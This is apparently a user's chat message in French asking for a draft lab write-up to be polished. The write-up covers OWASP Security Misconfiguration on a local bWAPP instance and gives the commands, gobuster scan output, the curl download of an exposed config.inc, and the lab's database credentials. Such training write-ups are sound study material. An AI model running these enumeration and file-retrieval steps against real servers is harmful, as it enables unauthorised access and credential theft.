vazy t'es trop nul

voila ce que je voulais (améliore et met en forme) : 

# A05:2021-Security Misconfiguration

## Intro

## Premier scénario

### Attaque 1 — Configuration / Backup File Disclosure (Old/Backup & Unreferenced Files)

#### Contexte
Environnement : bWAPP local (http://127.0.0.1:8081).  
Objectif : démontrer qu’un fichier de configuration accessible par HTTP divulgue des identifiants sensibles (OWASP A05:2021 - Security Misconfiguration).
Des fichiers de configuration et de sauvegarde sont présents ou référencés par l’application et peuvent être téléchargés par un attaquant via HTTP. Ces fichiers contiennent souvent des identifiants de base de données ou du code source. Leur exposition permet l’accès à la base de données et l’exfiltration des données applicatives.

1. Récupération d’une wordlist (SecLists - `common.txt`) :
curl -sS -o /home/env-admin/common.txt \
  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt

2. Scan du site web grâce à la commande curl et la wordlist
gobuster dir -u http://127.0.0.1:8081/ -w /tmp/common.txt -x php,inc,bak,zip -t 40 -o /tmp/gobuster_simple.txt

3. Analyse des fichiers de sorties
/.htaccess.inc       [33m (Status: 403)[0m [Size: 291]
/.hta.bak            [33m (Status: 403)[0m [Size: 286]
/.hta                [33m (Status: 403)[0m [Size: 282]
/.hta.inc            [33m (Status: 403)[0m [Size: 286]
/.htaccess.bak       [33m (Status: 403)[0m [Size: 291]
/.htpasswd           [33m (Status: 403)[0m [Size: 287]
/.htaccess           [33m (Status: 403)[0m [Size: 287]
/.hta.zip            [33m (Status: 403)[0m [Size: 286]
/.htaccess.php       [33m (Status: 403)[0m [Size: 291]
/.hta.php            [33m (Status: 403)[0m [Size: 286]
/.htpasswd.inc       [33m (Status: 403)[0m [Size: 291]
/.htpasswd.php       [33m (Status: 403)[0m [Size: 291]
/.htaccess.zip       [33m (Status: 403)[0m [Size: 291]
/.htpasswd.zip       [33m (Status: 403)[0m [Size: 291]
/.htpasswd.bak       [33m (Status: 403)[0m [Size: 291]
/admin               [36m (Status: 301)[0m [Size: 312][34m [--> http://127.0.0.1:8081/admin/][0m
/apps                [36m (Status: 301)[0m [Size: 311][34m [--> http://127.0.0.1:8081/apps/][0m
/backdoor.php        [32m (Status: 200)[0m [Size: 333]
/bugs                [32m (Status: 200)[0m [Size: 7858]
/captcha.php         [36m (Status: 302)[0m [Size: 0][34m [--> login.php][0m
/cgi-bin/.zip        [33m (Status: 403)[0m [Size: 290]
/cgi-bin/.php        [33m (Status: 403)[0m [Size: 290]
/cgi-bin/.inc        [33m (Status: 403)[0m [Size: 290]
/cgi-bin/.bak        [33m (Status: 403)[0m [Size: 290]
/cgi-bin/            [33m (Status: 403)[0m [Size: 286]
/config.inc          [32m (Status: 200)[0m [Size: 774]
/connect.php         [32m (Status: 200)[0m [Size: 0]
/credits.php         [36m (Status: 302)[0m [Size: 0][34m [--> login.php][0m
/db                  [36m (Status: 301)[0m [Size: 309][34m [--> http://127.0.0.1:8081/db/][0m
/documents           [36m (Status: 301)[0m [Size: 316][34m [--> http://127.0.0.1:8081/documents/][0m
/fonts               [36m (Status: 301)[0m [Size: 312][34m [--> http://127.0.0.1:8081/fonts/][0m
/images              [36m (Status: 301)[0m [Size: 313][34m [--> http://127.0.0.1:8081/images/][0m
/index.php           [36m (Status: 302)[0m [Size: 0][34m [--> portal.php][0m
/index.php           [36m (Status: 302)[0m [Size: 0][34m [--> portal.php][0m
/info.php            [32m (Status: 200)[0m [Size: 3426]
/info.php            [32m (Status: 200)[0m [Size: 3426]
/install.php         [32m (Status: 200)[0m [Size: 2270]
/js                  [36m (Status: 301)[0m [Size: 309][34m [--> http://127.0.0.1:8081/js/][0m
/login.php           [32m (Status: 200)[0m [Size: 4013]
/logout.php          [36m (Status: 302)[0m [Size: 0][34m [--> login.php][0m
/message             [32m (Status: 200)[0m [Size: 28]
/passwords           [36m (Status: 301)[0m [Size: 316][34m [--> http://127.0.0.1:8081/passwords/][0m
/phpinfo.php         [32m (Status: 200)[0m [Size: 78557]
/phpinfo.php         [32m (Status: 200)[0m [Size: 78557]
/portal.php          [36m (Status: 302)[0m [Size: 0][34m [--> login.php][0m
/portal              [32m (Status: 200)[0m [Size: 5396]
/portal.zip          [32m (Status: 200)[0m [Size: 5396]
/portal.bak          [32m (Status: 200)[0m [Size: 6594]
/robots.txt          [32m (Status: 200)[0m [Size: 167]
/robots              [32m (Status: 200)[0m [Size: 167]
/secret.php          [36m (Status: 302)[0m [Size: 0][34m [--> login.php][0m
/security.php        [36m (Status: 302)[0m [Size: 0][34m [--> login.php][0m
/server-status       [33m (Status: 403)[0m [Size: 291]
/soap                [36m (Status: 301)[0m [Size: 311][34m [--> http://127.0.0.1:8081/soap/][0m
/stylesheets         [36m (Status: 301)[0m [Size: 318][34m [--> http://127.0.0.1:8081/stylesheets/][0m
/test.php            [32m (Status: 200)[0m [Size: 0]
/training.php        [32m (Status: 200)[0m [Size: 3843]
/update.php          [32m (Status: 200)[0m [Size: 0]
/web.config          [32m (Status: 200)[0m [Size: 7556]

Découverte du fichier config.inc

4. Téléchargement du fichier 
curl -sS http://127.0.0.1:8081/config.inc -o /tmp/config.inc

5. Informations extrait 
// Connection settings
$server = "localhost";
$username = "bwapp";
$password = "bwApped";
$database = "bWAPP";
